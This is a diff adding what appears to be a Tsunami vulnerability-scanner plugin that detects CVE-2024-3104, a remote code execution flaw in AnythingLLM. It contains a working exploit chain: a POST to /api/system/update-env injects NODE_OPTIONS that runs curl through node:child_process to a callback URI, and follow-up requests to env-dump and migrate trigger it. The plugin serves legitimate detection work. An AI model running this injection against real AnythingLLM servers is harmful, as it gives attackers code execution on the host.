@@ -1,0 +1,146 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "AnythingLLM_CVE_2024_3104"
+  author: 
+    "Robert Dick (robert@doyensec.com) for the Templated version,"
+    " frkngksl for the original Java version"
+  version: "2.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "GOOGLE"
+    value: "AnythingLLM_CVE_2024_3104"
+  }
+  severity: HIGH
+  title: "CVE-2024-3104 anything-llm RCE"
+  description: 
+    "A remote code execution vulnerability exists in mintplex-labs/anything-llm due"
+    " to improper handling of environment variables. Attackers can exploit"
+    " this vulnerability by injecting arbitrary environment variables via the"
+    " POST /api/system/update-env endpoint, which allows for the execution of"
+    " arbitrary code on the host running anything-llm.Successful exploitation"
+    " could lead to code execution on the host, enabling attackers to read"
+    " and modify data accessible to the user running the service, potentially"
+    " leading to a denial of service."
+  recommendation:
+    "You can upgrade your anything-llm instances to a version whose commit ID is"
+    " bfedfebfab032e6f4d5a369c8a2f947c5d0c5286 or later."
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2024-3104"
+  }
+}
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "fingerprint_anythingllm"
+  http_request: {
+    method: GET
+    uri: "/"
+    response: {
+      http_status: 200
+      expect_all {
+        conditions: [
+          { body: {} contains: '<title>AnythingLLM | Your personal LLM trained on anything</title>' }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "update_env"
+  http_request: {
+    method: POST
+    uri: "/api/system/update-env"
+    data: 
+      "{\"LocalAiBasePath\":\"http://cb.tsunami/v1'\\n"
+      "NODE_OPTIONS='--import=\\\"data:text/javascript,import exec from"
+      " \\\\\\\"node:child_process\\\\\\\";exec.execSync(\\\\\\\"curl {{ T_CBS_URI }}\\\\\\\")\\\"\"}"
+    headers: { name: "Content-Type" value: "text/plain;charset=UTF-8"}
+    response: {
+      http_status: 200
+      expect_all {
+        conditions: [
+          { body: {} contains: "\"error\":false" }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "env_dump"
+  http_request: {
+    method: GET
+    uri: "/api/env-dump"
+    response: {
+      http_status: 200
+      expect_all {
+        conditions: [
+          { body: {} contains: 'OK' }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "migrate"
+  http_request: {
+    method: GET
+    uri: "/api/migrate"
+    response: {
+      http_status: 200
+      expect_all {
+        conditions: [
+          { body: {} contains: 'OK' }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "sleep"
+  utility: { sleep: { duration_ms: 1000 } }
+}
+
+actions: {
+  name: "check_callback_server_logs"
+  callback_server: { action_type: CHECK }
+}
+
+actions: {}
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  condition: REQUIRES_CALLBACK_SERVER
+  actions: [
+    "fingerprint_anythingllm",
+    "update_env",
+    "env_dump",
+    "migrate",
+    "sleep",
+    "check_callback_server_logs"
+  ]
+}
+
+config: {
+  debug: true
+}
+
